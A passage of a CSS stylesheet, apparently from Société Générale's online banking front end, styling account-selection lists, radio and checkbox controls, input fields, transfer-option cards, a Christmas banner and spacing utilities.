    border-radius: 0 0 5px 5px;
    transition: max-height .3s; }
    .vupri_wrapper .vupri_super-select__list::-webkit-scrollbar {
      width: .75em;
      padding: .125rem; }
    .vupri_wrapper .vupri_super-select__list::-webkit-scrollbar-thumb {
      border: .125em solid #fff;
      border-radius: .375em;
      background: #999; }
    .vupri_wrapper .vupri_super-select__list fieldset:first-child .vupri_super-select__item--title {
      border-top: 0; }
    .vupri_wrapper .vupri_super-select__list fieldset .vupri_super-select__item:last-child {
      border-bottom: 0; }
  .vupri_wrapper .vupri_super-select__item, .vupri_wrapper .vupri_super-select__toggle {
    cursor: pointer;
    transition: background-color .3s;
    color: #333; }
  .vupri_wrapper .vupri_super-select__item:not(.vupri_super-select__item--selected) {
    display: none; }
  .vupri_wrapper .vupri_super-select__item--default:not(.vupri_super-select__item--selected) {
    display: block; }
  .vupri_wrapper .vupri_super-select__item--selected .vupri_super-select__button {
    padding-top: 0.875rem;
    padding-bottom: 0.875rem; }
  .vupri_wrapper .vupri_super-select__item--selected .vupri_super-select__libelle {
    margin-bottom: 0.5rem; }
  .vupri_wrapper .vupri_super-select__item--selected .vupri_super-select__account_number {
    color: #333; }
  .vupri_wrapper .vupri_super-select__libelle, .vupri_wrapper .vupri_super-select__solde {
    font-weight: 600; }
  .vupri_wrapper .vupri_super-select__libelle {
    display: block;
    float: left;
    max-width: 65%;
    margin-bottom: 0.25rem;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis; }
  .vupri_wrapper .vupri_super-select__solde {
    float: right;
    font-size: 1.125rem; }
    .vupri_wrapper .vupri_super-select__solde--positif {
      color: #5e8b54; }
  .vupri_wrapper .vupri_super-select__account_number {
    clear: left;
    float: left;
    font-size: 0.875rem;
    color: #666; }
  .vupri_wrapper .vupri_super-select__item {
    padding: 0;
    overflow: hidden;
    border-bottom: 1px solid #dedede; }
    .vupri_wrapper .vupri_super-select__item--title {
      padding: 0.5rem 2.5rem 0.5rem 2.875rem;
      text-transform: uppercase;
      background-color: #f7f7f7;
      color: #333;
      border: 0;
      font-weight: 600;
      cursor: default; }
    .vupri_wrapper .vupri_super-select__item--default {
      padding: 0.5rem 2.5rem 0.5rem 1.5rem;
      font-size: 1rem;
      font-weight: 600;
      border-bottom: 0; }
    .vupri_wrapper .vupri_super-select__item--link {
      padding: 1.125rem 2.5rem 1.125rem 2.875rem;
      font-weight: 600;
      border-bottom: 0; }
      .vupri_wrapper .vupri_super-select__item--link svg {
        display: inline-block;
        vertical-align: middle;
        margin-right: 0.25rem; }
    .vupri_wrapper .vupri_super-select__item button[aria-selected="true"].vupri_super-select__button {
      background: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2221%22 height=%2216%22 viewBox=%220 0 21 16%22%3E%3Cpath fill=%22%233AC596%22 fill-rule=%22nonzero%22 d=%22M3.839 5.82a1.073 1.073 0 0 0-1.532 1.503l6.2 6.26c.42.43 1.11.43 1.53.001l9.656-9.76a1.073 1.073 0 1 0-1.531-1.503l-8.89 8.98-5.433-5.48z%22/%3E%3C/svg%3E") no-repeat 1rem center; }
      @media screen and (max-width: 768px) {
        .vupri_wrapper .vupri_super-select__item button[aria-selected="true"].vupri_super-select__button {
          background-position-x: .625rem; } }
    .vupri_wrapper .vupri_super-select__item--option-del {
      position: relative; }
      .vupri_wrapper .vupri_super-select__item--option-del:hover > .vupri_super-select__button--del {
        opacity: 1; }
      .vupri_wrapper .vupri_super-select__item--option-del .vupri_super-select__button {
        width: calc(100% - 90px);
        vertical-align: middle; }
  .vupri_wrapper .vupri_super-select__button {
    padding: 0.625rem 1.375rem 0.625rem 3.5rem;
    width: 100%;
    border: 0;
    background-color: transparent;
    z-index: 1;
    cursor: pointer; }
    .vupri_wrapper .vupri_super-select__button:focus {
      border: 1px dotted; }
    .vupri_wrapper .vupri_super-select__button:hover + .vupri_super-select__button--del, .vupri_wrapper .vupri_super-select__button:focus + .vupri_super-select__button--del {
      opacity: 1; }
    .vupri_wrapper .vupri_super-select__button--del {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      z-index: 2;
      background: none;
      border: 0;
      cursor: pointer;
      opacity: 0;
      width: 3rem;
      height: 3rem;
      fill: #333;
      vertical-align: middle; }
      .vupri_wrapper .vupri_super-select__button--del:focus, .vupri_wrapper .vupri_super-select__button--del:hover {
        fill: #f05b6f;
        opacity: 1; }
      .vupri_wrapper .vupri_super-select__button--del svg {
        width: 25px;
        height: 28px; }
  @media screen and (max-width: 768px) {
    .vupri_wrapper .vupri_super-select__toggle {
      padding-left: 1rem; }
      .vupri_wrapper .vupri_super-select__toggle::after {
        right: 1rem; }
    .vupri_wrapper .vupri_super-select__item {
      padding: 0; }
      .vupri_wrapper .vupri_super-select__item--title {
        padding: 1rem;
        font-size: .875rem; }
      .vupri_wrapper .vupri_super-select__item--default {
        padding: 0.5rem 1.5rem; }
      .vupri_wrapper .vupri_super-select__item--link {
        padding: 1rem; }
      .vupri_wrapper .vupri_super-select__item button[aria-selected="true"].vupri_super-select__button {
        padding: 1rem 1rem 1rem 2.5rem; }
      .vupri_wrapper .vupri_super-select__item--option-del .vupri_super-select__button {
        width: calc(100% - 45px); }
    .vupri_wrapper .vupri_super-select__button {
      padding: 1rem; }
      .vupri_wrapper .vupri_super-select__button--del {
        width: 40px;
        height: 40px;
        opacity: 1; }
        .vupri_wrapper .vupri_super-select__button--del svg {
          width: 13px;
          height: 14px; }
    .vupri_wrapper .vupri_super-select__libelle, .vupri_wrapper .vupri_super-select__solde {
      margin-top: 0;
      font-size: 0.875rem; }
    .vupri_wrapper .vupri_super-select__account_number {
      font-size: 0.75rem; }
    .vupri_wrapper .vupri_super-select.is-open .vupri_super-select__solde {
      margin-top: 0; } }

.vupri_wrapper .vupri_radio,
.vupri_wrapper .vupri_checkbox {
  margin-bottom: 2rem; }
  .vupri_wrapper .vupri_radio:last-of-type,
  .vupri_wrapper .vupri_checkbox:last-of-type {
    margin-bottom: 1rem; }
  .vupri_wrapper .vupri_radio__input,
  .vupri_wrapper .vupri_checkbox__input {
    position: absolute;
    opacity: 0; }
    .vupri_wrapper .vupri_radio__input:checked + .vupri_radio__label,
    .vupri_wrapper .vupri_radio__input:checked + .vupri_checkbox__label,
    .vupri_wrapper .vupri_checkbox__input:checked + .vupri_radio__label,
    .vupri_wrapper .vupri_checkbox__input:checked + .vupri_checkbox__label {
      color: #333; }
      .vupri_wrapper .vupri_radio__input:checked + .vupri_radio__label:before,
      .vupri_wrapper .vupri_radio__input:checked + .vupri_checkbox__label:before,
      .vupri_wrapper .vupri_checkbox__input:checked + .vupri_radio__label:before,
      .vupri_wrapper .vupri_checkbox__input:checked + .vupri_checkbox__label:before {
        opacity: 1; }
    .vupri_wrapper .vupri_radio__input:focus + .vupri_checkbox__label,
    .vupri_wrapper .vupri_checkbox__input:focus + .vupri_checkbox__label {
      border: 1px dotted #dedede; }
    .vupri_wrapper .vupri_radio__input:focus + .vupri_radio__label,
    .vupri_wrapper .vupri_checkbox__input:focus + .vupri_radio__label {
      border: 1px dotted;
      border-radius: 3px; }
  .vupri_wrapper .vupri_radio__label,
  .vupri_wrapper .vupri_checkbox__label {
    display: inline-block;
    position: relative;
    padding: 0.25rem 0.5rem 0.25rem 2.125rem;
    width: 100%;
    font-size: 1.125rem;
    color: #666;
    border: 1px solid transparent;
    cursor: pointer; }
    .vupri_wrapper .vupri_radio__label:before,
    .vupri_wrapper .vupri_checkbox__label:before {
      content: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNyIgaGVpZ2h0PSIxNyIgdmlld0JveD0iMCAwIDE3IDE3Ij4KICA8ZGVmcz4KICAgIDxsaW5lYXJHcmFkaWVudCBpZD0iZ3JhZGllbnQiIHgxPSI3MiUiIHgyPSIzNiUiIHkxPSIwJSIgeTI9IjEwMCUiPgogICAgICA8c3RvcCBvZmZzZXQ9IjAlIiBzdG9wLWNvbG9yPSIjNjZDRjkxIi8+CiAgICAgIDxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iIzNBQzU5NiIvPgogICAgPC9saW5lYXJHcmFkaWVudD4KICA8L2RlZnM+CiAgPGNpcmNsZSBzaGFwZS1yZW5kZXJpbmc9ImF1dG8iIGN4PSI4LjUiIGN5PSI4LjUiIHI9IjguNSIgc3Ryb2tlPSJub25lIiBmaWxsPSJ1cmwoI2dyYWRpZW50KSIgLz4KPC9zdmc+);
      position: absolute;
      top: 1px;
      left: .25rem;
      z-index: 2;
      width: 1.0625rem;
      height: 1.0625rem;
      opacity: 0;
      transition: opacity .3s; }
    .vupri_wrapper .vupri_radio__label:after,
    .vupri_wrapper .vupri_checkbox__label:after {
      -webkit-box-sizing: inherit;
      box-sizing: inherit;
      content: '';
      position: absolute;
      z-index: 1;
      top: 0;
      left: 0;
      width: 1.5625rem;
      height: 1.5625rem;
      background: #f7f7f7;
      border: 1px solid #999;
      border-radius: 50%; }
    .vupri_wrapper .vupri_radio__label a:link,
    .vupri_wrapper .vupri_radio__label a:visited,
    .vupri_wrapper .vupri_checkbox__label a:link,
    .vupri_wrapper .vupri_checkbox__label a:visited {
      color: inherit; }
  .vupri_wrapper .vupri_radio.is-invalid .vupri_radio__input + .vupri_radio__label:after,
  .vupri_wrapper .vupri_radio.is-invalid .vupri_checkbox__input + .vupri_checkbox__label:after,
  .vupri_wrapper .vupri_checkbox.is-invalid .vupri_radio__input + .vupri_radio__label:after,
  .vupri_wrapper .vupri_checkbox.is-invalid .vupri_checkbox__input + .vupri_checkbox__label:after {
    border-color: #e82d50; }
  .vupri_wrapper .vupri_radio.is-invalid ~ .vupri_radio__msg,
  .vupri_wrapper .vupri_radio.is-invalid ~ .vupri_checkbox__msg,
  .vupri_wrapper .vupri_checkbox.is-invalid ~ .vupri_radio__msg,
  .vupri_wrapper .vupri_checkbox.is-invalid ~ .vupri_checkbox__msg {
    color: #e82d50; }
  .vupri_wrapper .vupri_radio__msg,
  .vupri_wrapper .vupri_checkbox__msg {
    font-size: 0.875rem;
    font-weight: 600;
    color: #333; }
  @media screen and (max-width: 768px) {
    .vupri_wrapper .vupri_radio__label,
    .vupri_wrapper .vupri_checkbox__label {
      font-size: 0.875rem; } }

.vupri_wrapper .vupri_radio__label:before, .vupri_wrapper .vupri_radio__label:after {
  top: 50%;
  transform: translateY(-50%); }

.vupri_wrapper .vupri_checkbox__input:checked + .vupri_checkbox__label:after {
  background-image: linear-gradient(200deg, #66cf91, #3AC596);
  background-color: #3AC596;
  border-color: #3AC596; }

.vupri_wrapper .vupri_checkbox__label:before {
  content: '';
  display: block;
  width: 1.4375rem;
  height: 1.4375rem;
  left: 1px;
  background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
  background-repeat: no-repeat;
  background-position: -.125rem -1.6875rem;
  background-size: 9.75rem 4.875rem;
  border-radius: 5px; }

.vupri_wrapper .vupri_checkbox__label:after {
  border-radius: 5px;
  transition: background-color .3s; }

.vupri_wrapper .vupri_input {
  position: relative;
  width: 100%;
  min-height: 4.25em;
  font-family: 'sourcesanspro', Arial, sans-serif; }
  .vupri_wrapper .vupri_input__field {
    display: block;
    margin: 0;
    padding: 0.5rem;
    width: 100%;
    font-size: 1.125rem;
    color: #333;
    border: none;
    border-bottom: 1px solid #999;
    border-radius: 0;
    background: none;
    box-shadow: none;
    outline: none;
    -webkit-appearance: none;
    appearance: none; }
    .vupri_wrapper .vupri_input__field:focus {
      outline: none; }
      .vupri_wrapper .vupri_input__field:focus ~ .vupri_input__bar:before,
      .vupri_wrapper .vupri_input__field:focus ~ .vupri_input__bar:after {
        width: 50%; }
      .vupri_wrapper .vupri_input__field:focus ~ .vupri_input__label {
        top: -.75rem;
        left: 0;
        font-size: 0.75rem;
        font-weight: 600;
        color: #999; }
    .vupri_wrapper .vupri_input__field::-ms-clear {
      display: none; }
    .vupri_wrapper .vupri_input__field.is-valid {
      padding-right: 3.125rem;
      border-color: #333;
      color: #333; }
      .vupri_wrapper .vupri_input__field.is-valid ~ .vupri_input__icon {
        background-position: 0 0; }
      .vupri_wrapper .vupri_input__field.is-valid ~ .vupri_input__label {
        top: -.75rem;
        left: 0;
        font-size: 0.75rem;
        font-weight: 600;
        color: #999; }
    .vupri_wrapper .vupri_input__field.is-invalid {
      padding-right: 3.125rem; }
      .vupri_wrapper .vupri_input__field.is-invalid ~ .vupri_input__icon {
        background-position: -1.625rem 0; }
      .vupri_wrapper .vupri_input__field.is-invalid ~ .vupri_input__msg {
        color: #e82d50; }
      .vupri_wrapper .vupri_input__field.is-invalid ~ .vupri_input__bar:before,
      .vupri_wrapper .vupri_input__field.is-invalid ~ .vupri_input__bar:after {
        width: 50%;
        background: #e82d50; }
      .vupri_wrapper .vupri_input__field.is-invalid ~ .vupri_input__label {
        top: -.75rem;
        left: 0;
        font-size: 0.75rem;
        font-weight: 600;
        color: #999; }
    .vupri_wrapper .vupri_input__field.is-deactivated, .vupri_wrapper .vupri_input__field:disabled {
      padding-right: 3.125rem;
      background: none;
      color: #999;
      -webkit-text-fill-color: #999;
      opacity: 1; }
      .vupri_wrapper .vupri_input__field.is-deactivated ~ .vupri_input__icon, .vupri_wrapper .vupri_input__field:disabled ~ .vupri_input__icon {
        background-position: -8.125rem 0; }
    .vupri_wrapper .vupri_input__field:required {
      box-shadow: unset; }
    .vupri_wrapper .vupri_input__field.is-filled {
      border-color: #333; }
      .vupri_wrapper .vupri_input__field.is-filled ~ .vupri_input__label {
        top: -.75rem;
        left: 0;
        font-size: 0.75rem;
        font-weight: 600;
        color: #999; }
    .vupri_wrapper .vupri_input__field.flatpickr-open {
      border-color: #333; }
      .vupri_wrapper .vupri_input__field.flatpickr-open ~ .vupri_input__icon {
        background-position: -4.875rem -1.625rem; }
  .vupri_wrapper .vupri_input__icon {
    display: block;
    position: absolute;
    top: .375rem;
    right: .8125rem;
    width: 1.625rem;
    height: 1.625rem;
    font-size: .8em;
    background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
    background-repeat: no-repeat;
    background-position: 1.75rem 0;
    background-size: 9.5rem 4.875rem; }
  .vupri_wrapper .vupri_input__label {
    position: absolute;
    left: 0.5rem;
    top: 0.5rem;
    font-family: 'sourcesanspro', sans-serif;
    font-size: 1.125rem;
    color: #666;
    transition: .2s ease all;
    pointer-events: none; }
  .vupri_wrapper .vupri_input__bar {
    display: block;
    position: relative;
    width: 100%; }
    .vupri_wrapper .vupri_input__bar:before, .vupri_wrapper .vupri_input__bar:after {
      content: '';
      position: absolute;
      bottom: 0;
      width: 0;
      height: .0625rem;
      background: #333;
      transition: .2s ease all; }
    .vupri_wrapper .vupri_input__bar:before {
      left: 50%; }
    .vupri_wrapper .vupri_input__bar:after {
      right: 50%; }
  .vupri_wrapper .vupri_input--calendar {
    background: none;
    cursor: pointer; }
    .vupri_wrapper .vupri_input--calendar:hover > .vupri_input__icon {
      background-position: -4.875rem -1.625rem; }
    .vupri_wrapper .vupri_input--calendar:hover .vupri_input__field:disabled ~ .vupri_input__icon,
    .vupri_wrapper .vupri_input--calendar:hover .vupri_input__field.is-disabled ~ .vupri_input__icon {
      background-position: -8.125rem 0; }
    .vupri_wrapper .vupri_input--calendar:focus {
      outline: none; }
    .vupri_wrapper .vupri_input--calendar > .vupri_input__icon {
      top: 0.25rem;
      background-position: -4.875rem 0;
      cursor: pointer;
      pointer-events: none; }
      .vupri_wrapper .vupri_input--calendar > .vupri_input__icon:hover {
        background-position: -4.875rem -1.625rem; }
  .vupri_wrapper .vupri_input__msg {
    margin-top: 0.5rem;
    font-size: 0.875rem;
    font-weight: 600;
    color: #333; }

.vupri_wrapper .vupri_vignette {
  position: relative;
  margin-bottom: 1.5rem;
  padding: 1rem 1rem 1rem 1.5rem;
  width: 100%;
  border: 1px solid #dedede;
  border-radius: 5px;
  transition: opacity .3s, border-color .3s;
  min-height: 5.5625rem; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_vignette_container {
      flex-direction: column; } }
  .vupri_wrapper .vupri_vignette:last-child {
    margin-bottom: 2.5rem; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_vignette {
      padding: 1rem;
      /* margin: 0 auto; Correction des marges pour les vignettes sur SBM, à valider par un inté */ } }
  .vupri_wrapper .vupri_vignette--deactivated .vupri_radio__label,
  .vupri_wrapper .vupri_vignette--deactivated .vupri_vignette__triangle,
  .vupri_wrapper .vupri_vignette--deactivated .vupri_vignette__message:not(.vupri_vignette__message--alert) {
    opacity: 0.4; }
  .vupri_wrapper .vupri_vignette--deactivated .vupri_vignette__message,
  .vupri_wrapper .vupri_vignette--deactivated .vupri_vignette__message--little {
    color: #333; }
  .vupri_wrapper .vupri_vignette__message {
    clear: left;
    padding: 0 3.75rem 0 2.5rem;
    line-height: 1;
    color: #666; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_vignette__message {
        font-size: 0.875rem;
        padding-left: 0;
        line-height: 1.5rem; } }
    .vupri_wrapper .vupri_vignette__message--big {
      font-size: 1.25rem; }
    .vupri_wrapper .vupri_vignette__message--little {
      margin-top: 0.5rem;
      font-size: 0.75rem; }
      .vupri_wrapper .vupri_vignette__message--little > a {
        color: #333333;
        text-decoration: underline; }
    .vupri_wrapper .vupri_vignette__message--alert {
      font-size: 0.875rem;
      color: #666;
      margin-top: 0.5rem; }
      @media only screen and (max-width: 768px) {
        .vupri_wrapper .vupri_vignette__message--alert {
          line-height: 1rem;
          padding-right: 0; } }
  .vupri_wrapper .vupri_vignette .vupri_radio {
    float: left;
    margin-bottom: 0.5rem;
    width: 100%;
    padding-right: 3.125rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_vignette .vupri_radio {
        margin-bottom: 1rem;
        padding-right: 2.5rem; } }
    .vupri_wrapper .vupri_vignette .vupri_radio__label {
      padding: 0 0 0 2.5rem;
      font-size: 1.125rem;
      color: #333;
      font-weight: 600; }
  .vupri_wrapper .vupri_vignette .vupri_input {
    max-width: 210px;
    margin: 1.5rem 0 0 2.5rem; }
  .vupri_wrapper .vupri_vignette__triangle {
    position: absolute;
    right: 1rem;
    top: .75rem;
    display: flex;
    flex-direction: column;
    align-items: center; }
    .vupri_wrapper .vupri_vignette__triangle_label {
      color: #666;
      font-weight: 600;
      margin-top: 0.25rem; }
      @media only screen and (max-width: 768px) {
        .vupri_wrapper .vupri_vignette__triangle_label {
          font-size: 0.875rem; } }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_vignette__triangle:after {
        border-width: 3rem; }
      .vupri_wrapper .vupri_vignette__triangle .vupri_vignette__icon {
        width: 1.875rem;
        height: 1.875rem; }
      .vupri_wrapper .vupri_vignette__triangle p {
        font-size: 0.875rem; } }
  .vupri_wrapper .vupri_vignette__vicla .vupri_input--calendar {
    margin-top: 1.375rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_vignette__vicla .vupri_input--calendar {
        margin-left: 0;
        max-width: inherit; } }
  .vupri_wrapper .vupri_vignette__body {
    display: none; }
  .vupri_wrapper .vupri_vignette__viper .vupri_select {
    position: relative;
    max-width: 12.5rem;
    width: 100%; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__months.is-open > .vupri_select__list, .vupri_wrapper .vupri_vignette__viper .vupri_select__years.is-open > .vupri_select__list {
      border: 0;
      max-height: 12.9375rem;
      -webkit-border-radius: .3125rem;
      -moz-border-radius: .3125rem;
      border-radius: .3125rem; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__toggle {
      color: #333; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__list {
      box-shadow: 0 8px 25px 0 rgba(0, 0, 0, 0.15); }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__item--button {
      cursor: pointer; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__months .vupri_select__list, .vupri_wrapper .vupri_vignette__viper .vupri_select__years .vupri_select__list {
      position: absolute;
      bottom: 1px; }
      .vupri_wrapper .vupri_vignette__viper .vupri_select__months .vupri_select__list::-webkit-scrollbar, .vupri_wrapper .vupri_vignette__viper .vupri_select__years .vupri_select__list::-webkit-scrollbar {
        width: .375rem; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__months .vupri_select__item, .vupri_wrapper .vupri_vignette__viper .vupri_select__years .vupri_select__item {
      margin: 0.5rem 0;
      padding: 0; }
      .vupri_wrapper .vupri_vignette__viper .vupri_select__months .vupri_select__item--button, .vupri_wrapper .vupri_vignette__viper .vupri_select__years .vupri_select__item--button {
        padding: 0 0.5rem;
        text-align: center;
        color: #999;
        width: 100%; }
  .vupri_wrapper .vupri_vignette__viper .vupri_number_transfers {
    position: absolute;
    bottom: 0;
    left: 0;
    font-size: 0.75rem;
    color: #666;
    margin-top: 0.25rem; }
  .vupri_wrapper .vupri_vignette__viper .vupri_checkbox__label {
    width: auto; }
  .vupri_wrapper .vupri_vignette__block {
    display: none;
    margin: 0 4rem 0 2.5rem; }
    .vupri_wrapper .vupri_vignette__block .vupri_select, .vupri_wrapper .vupri_vignette__block .vupri_input {
      margin: 0; }
    .vupri_wrapper .vupri_vignette__block .vupri_select__content {
      position: relative;
      display: flex; }
      .vupri_wrapper .vupri_vignette__block .vupri_select__content .vupri_select {
        margin-bottom: 1.25rem; }
    .vupri_wrapper .vupri_vignette__block .vupri_select__months {
      max-width: 8rem;
      width: 100%;
      margin-right: 1rem; }
    .vupri_wrapper .vupri_vignette__block .vupri_select__years {
      max-width: 5rem;
      width: 100%; }
    .vupri_wrapper .vupri_vignette__block .vupri_select__toggle {
      border-color: #3b4357; }
    .vupri_wrapper .vupri_vignette__block .vupri_input--calendar {
      max-width: 14rem; }
      .vupri_wrapper .vupri_vignette__block .vupri_input--calendar .vupri_input__icon {
        right: 0;
        width: 1.375rem; }
    .vupri_wrapper .vupri_vignette__block_item {
      flex: 1; }
    .vupri_wrapper .vupri_vignette__block .vupri_checkbox {
      margin-bottom: 1rem; }
      .vupri_wrapper .vupri_vignette__block .vupri_checkbox__label {
        padding-top: 0;
        padding-bottom: 0;
        font-size: 0.875rem;
        line-height: 1.5rem; }
  .vupri_wrapper .vupri_vignette .vupri_radio__input:disabled + .vupri_radio__label {
    cursor: default; }
  .vupri_wrapper .vupri_vignette .vupri_radio__label {
    padding-top: 0;
    padding-bottom: 0;
    width: auto;
    line-height: 1.25; }
  .vupri_wrapper .vupri_vignette--checked {
    opacity: 1;
    border: 0;
    box-shadow: 0 10px 30px 0 rgba(0, 0, 0, 0.1); }
    .vupri_wrapper .vupri_vignette--checked .vupri_vignette__triangle {
      color: #333; }
      .vupri_wrapper .vupri_vignette--checked .vupri_vignette__triangle_label {
        color: #333; }
    .vupri_wrapper .vupri_vignette--checked .vupri_vignette__message:not(.vupri_vignette__body) {
      color: #333; }
    .vupri_wrapper .vupri_vignette--checked .vupri_vignette__body {
      display: block; }
    .vupri_wrapper .vupri_vignette--checked .vupri_vignette__block {
      display: flex; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_vignette__viper .vupri_select {
      max-width: inherit; }
      .vupri_wrapper .vupri_vignette__viper .vupri_select__toggle {
        padding: 0.5rem 0.5rem 0.5rem 0; }
      .vupri_wrapper .vupri_vignette__viper .vupri_select__content {
        margin: 1rem 0 1.5rem; }
    .vupri_wrapper .vupri_vignette__viper .vupri_vignette__block {
      flex-direction: column;
      margin: 2.5rem 0 0; }
      .vupri_wrapper .vupri_vignette__viper .vupri_vignette__block:last-child {
        flex-direction: column-reverse;
        margin-top: 1.5rem; }
        .vupri_wrapper .vupri_vignette__viper .vupri_vignette__block:last-child .vupri_vignette__block_item.vupri_checkbox {
          margin-top: 0; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__months {
      flex: 2;
      max-width: inherit; }
    .vupri_wrapper .vupri_vignette__viper .vupri_select__years {
      flex: 1;
      max-width: inherit; }
    .vupri_wrapper .vupri_vignette__viper .vupri_input--calendar {
      max-width: inherit;
      margin-top: 0.5rem; } }

@media screen and (min-width: 0\0) {
  .vupri_wrapper .vupri_vignette {
    float: left; }
    .vupri_wrapper .vupri_vignette_container {
      overflow: hidden; } }

.vupri_wrapper .vupri_banner--christmas {
  display: flex;
  height: 6.25rem;
  max-width: 48.5625rem;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none; }
  @media only screen and (max-width: 768px) {
    .vupri_wrapper .vupri_banner--christmas {
      flex-direction: column;
      height: auto;
      -moz-user-select: text;
      -ms-user-select: text;
      user-select: text; } }
  .vupri_wrapper .vupri_banner--christmas .vupri_banner__illustration {
    background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/a8184cc263e8aa7c4fa9075853ae44ad.gif) no-repeat 0 -1.375rem;
    width: 15.5625rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_banner--christmas .vupri_banner__illustration {
        width: 100%;
        height: 7.5rem;
        background-size: cover;
        background-position: 0 -1.5rem; } }
  .vupri_wrapper .vupri_banner--christmas .vupri_banner__content {
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    flex: 1;
    border: 1px solid #dedede;
    border-left: 0;
    padding: 0.25rem 1rem 0.375rem 1.625rem; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_banner--christmas .vupri_banner__content {
        border-left: 1px solid #dedede;
        border-top: 0;
        padding: 0.5rem 1rem; } }
  .vupri_wrapper .vupri_banner--christmas .vupri_banner__title {
    position: relative;
    display: flex;
    flex-direction: column;
    font-size: .8125rem;
    text-transform: uppercase;
    font-weight: bold;
    line-height: 1.15; }
    .vupri_wrapper .vupri_banner--christmas .vupri_banner__title::after {
      content: '';
      position: absolute;
      height: 0.1875rem;
      width: 13.75rem;
      background-color: #333;
      left: -3rem;
      bottom: -0.25rem; }
      @media only screen and (max-width: 768px) {
        .vupri_wrapper .vupri_banner--christmas .vupri_banner__title::after {
          left: 0; } }
    .vupri_wrapper .vupri_banner--christmas .vupri_banner__title--strong {
      font-size: 2.5rem;
      font-weight: 800; }
  .vupri_wrapper .vupri_banner--christmas .vupri_banner__text {
    font-size: 0.875rem;
    font-weight: 600;
    line-height: 1; }
    @media only screen and (max-width: 768px) {
      .vupri_wrapper .vupri_banner--christmas .vupri_banner__text {
        margin-top: 0.5rem; } }
    .vupri_wrapper .vupri_banner--christmas .vupri_banner__text--strong {
      font-size: 1.125rem;
      font-weight: bold; }
    .vupri_wrapper .vupri_banner--christmas .vupri_banner__text--primary {
      color: #f05b6f; }

.vupri_wrapper .vupri_text--regular {
  font-weight: normal; }

.vupri_wrapper .vupri_text--semibold {
  font-weight: 600; }

.vupri_wrapper .vupri_text--bold {
  font-weight: bold; }

.vupri_wrapper .vupri_text--xs {
  font-size: 0.75rem; }

.vupri_wrapper .vupri_text--s {
  font-size: 0.875rem; }

.vupri_wrapper .vupri_text--m {
  font-size: 1rem; }

.vupri_wrapper .vupri_text--l {
  font-size: 1.125rem; }

.vupri_wrapper .vupri_text--xl {
  font-size: 1.25rem; }

.vupri_wrapper .vupri_mt--null {
  margin-top: 0; }

.vupri_wrapper .vupri_mt--xs {
  margin-top: 0.25rem; }

.vupri_wrapper .vupri_mt--s {
  margin-top: 0.5rem; }

.vupri_wrapper .vupri_mt--m {
  margin-top: 1rem; }

.vupri_wrapper .vupri_mt--l {
  margin-top: 1.5rem; }

.vupri_wrapper .vupri_mt--xl {
  margin-top: 2rem; }

.vupri_wrapper .vupri_mt--xxl {
  margin-top: 2.5rem; }

.vupri_wrapper .vupri_mb--null {
  margin-bottom: 0; }

.vupri_wrapper .vupri_mb--xs {
  margin-bottom: 0.25rem; }

.vupri_wrapper .vupri_mb--s {
  margin-bottom: 0.5rem; }

.vupri_wrapper .vupri_mb--m {
  margin-bottom: 1rem; }

.vupri_wrapper .vupri_mb--l {
  margin-bottom: 1.5rem; }

.vupri_wrapper .vupri_mb--xl {
  margin-bottom: 2rem; }

.vupri_wrapper .vupri_mb--xxl {
  margin-bottom: 2.5rem; }

.vupri_wrapper .vupri_ml--null {
  margin-left: 0; }

.vupri_wrapper .vupri_ml--xs {
  margin-left: 0.25rem; }

.vupri_wrapper .vupri_ml--s {
  margin-left: 0.5rem; }

.vupri_wrapper .vupri_ml--m {
  margin-left: 1rem; }

.vupri_wrapper .vupri_ml--l {
  margin-left: 1.5rem; }

.vupri_wrapper .vupri_ml--xl {
  margin-left: 2rem; }

.vupri_wrapper .vupri_ml--xxl {
  margin-left: 2.5rem; }

.vupri_wrapper .vupri_icon {
  display: inline-block; }
  .vupri_wrapper .vupri_icon__refresh {
